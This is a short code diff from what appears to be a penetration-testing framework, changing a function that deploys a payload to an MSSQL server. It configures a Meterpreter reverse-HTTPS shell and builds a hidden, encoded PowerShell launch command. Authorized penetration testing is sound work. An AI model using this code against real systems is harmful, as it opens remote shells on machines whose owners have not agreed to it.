@@ -8,7 +8,6 @@ import subprocess
 import time
 import src.core.setcore as core
 import impacket.tds as tds
-from src.payloads.powershell.prep import prep_powershell_payload
 
 #from src.core.payloadgen import create_payloads
 
@@ -173,7 +172,8 @@ def deploy_hex2binary(ipaddr, port, username, password):
 
         if choice1 == "1":
             web_path = None
-            prep_powershell_payload()
+
+            #prep_powershell_payload()
 
             # if we are using a SET interactive shell payload then we need to make
             # the path under web_clone versus ~./set
@@ -245,20 +245,20 @@ def deploy_hex2binary(ipaddr, port, username, password):
         filewrite.write("windows/meterpreter/reverse_https {0},".format(port))
         filewrite.close()
 
-        #try:
-        #    core.module_reload(src.payloads.powershell.prep)
-        #except:
-        #    import src.payloads.powershell.prep
+        try:
+            core.module_reload(src.payloads.powershell.prep)
+        except:
+            import src.payloads.powershell.prep
 
         # launch powershell
-        prep_powershell_payload()
+        #prep_powershell_payload()
 
         # create the directory if it does not exist
         if not os.path.isdir(os.path.join(core.setdir + "reports/powershell")):
             os.makedirs(os.path.join(core.setdir + "reports/powershell"))
 
         #with open(os.path.join(core.setdir + "x86.powershell")) as x86:
-        x86 = file(core.setdir + "x86.powershell").read()
+        x86 = file(core.setdir + "x86.powershell").read().rstrip()
         #    x86 = x86.read()
 
         x86 = "powershell -nop -window hidden -noni -EncodedCommand {0}".format(x86)
